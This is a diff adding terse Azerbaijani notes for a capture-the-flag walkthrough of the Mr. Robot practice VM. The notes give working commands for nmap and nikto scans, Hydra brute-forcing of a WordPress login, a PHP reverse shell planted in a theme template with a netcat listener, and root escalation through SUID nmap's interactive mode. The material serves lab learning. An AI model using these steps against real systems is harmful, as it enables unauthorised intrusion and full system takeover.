@@ -1,0 +1,89 @@
+mr robot, kali 
+1. networkden host only adaptr et
+2.mr robot ve kali run et
+3. mr robot ip adress gorunur
+ ip a (kalide  ip adresi gormek ucun yazirsan)
+4. sudo su (kalide yazirsan password hissesi gelir password kali)
+5. ping 192.168.56.101 (mr robotun ip adresini kalide yazib ping yoxlayiriq)
+6.nmap -p- 192.168.56.101
+7. firefox browser giririk ip adresi yaziriq 
+8. robots.txt giririk  192.168.56.101/robots.txt
+9. iceride cixan fayllara baxirig, lughet.dic cixir onu ctrl+s ile yukleyirik
+10. diger olan fayl adi code-1-of-4 txt onada baxirig ve ordan sifre cixir, onu yazib ilk suali tamamlayiriq
+11.sayti skan elemek
+nikto -url http://192.168.56.101
+/admin  /readme /image  gelecek ( gec olur biraz) wp-admin gelir
+bunlari hamsini browserde ip nin sonuna yazib baxacayig 192.168.56.101/admin ve s
+12.browserde 192.168.56.101/wp-admin yaziriq 
+13. burpsuite giririk
+open browser edirik, sonra oradan wo-admin hissesin kopy paste edib ora giririk, sonra 
+14.hydra -l testuser -p testparol 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:Invalid username.
+15.ls  eleyirik downloadsa giririk ls edirik yeniden evvelceden save etdiyimiz lughet.txt gelir sonra 
+cat lughet.txt | sort | uniq 
+hydra -V -L siyahi.txt -p testparol 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:Invalid username.'
+burada poppetg user olaraq gelir sifrede gorunur ama o sifre sehvdir  adi firefoxda bunu yaziriq gorunurki sifre sehvdir
+hydra -l poppetg -P siyahi.txt 192.168.56.101 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:The password you entered for the username.'
+bu kodu yaziriq burada hem user adi hemde parol gorunur  onlari yazib giririk
+16. sonra appearance de  editor hissesine gelirik
+orda 404 template de yaziriq 
+<?php
+
+echo "salam";
+?>
+
+sonra headerde eyni seyi yaziriq
+indi 404 sehifesi isleyir
+sonra giririk 
+php reverse shell deki kodu githubdaki kodu 404 template hissesine yapisdiririg
+orada ip adressi deyisib bizim kalideki ip adress edirik
+ve elave olaraq portu deyisirik 8081 qoyuruq
+nc -nvlp 8081 kodun yazib enter basiriq shell acilmis olur ls yazaraq yoxlayiriq
+
+17. find / -type f -name "*code-2-of-4.txt" 2>/dev/null
+cat /opt/bitnami/apps/wordpress/htdocs/
+ls 
+cat xikaxecclv6blevbuojtfdxy7t3z3qpa8wze3xzg-ServerS50-code-2-of-4.txt
+parol gelir sonra fso
+
+18. cd ~/
+ls
+cd /home
+ls
+(robot output)
+cd robot ( 2 fayl)
+cat password.raw-base64 | base64 -d 
+robot:crusher (crusher passworddu)
+python -c 'import pty; pty.spawn("/bin/sh")'
+su robot (passwordu yaziriq)
+cat code-3-of-4.txt
+yeni kod gelir
+find / -perm -4000 -type f 2>/dev/null
+/usr/local/bin/nmap localhost
+/usr/local/bin/nmap --interactive
+!sh
+id / whoami (iksinden birin yazanda root oldugumuzu goruruk)
+cd/root
+ls
+cat code-4-of-4.txt
+
+tam versiyasi
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+# id
+id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+code-4-of-4.txt
+# cat code-4-of-4.txt
+cat code-4-of-4.txt
+64ebe9604f23db395e67081bf111ac49551f4766
+# 
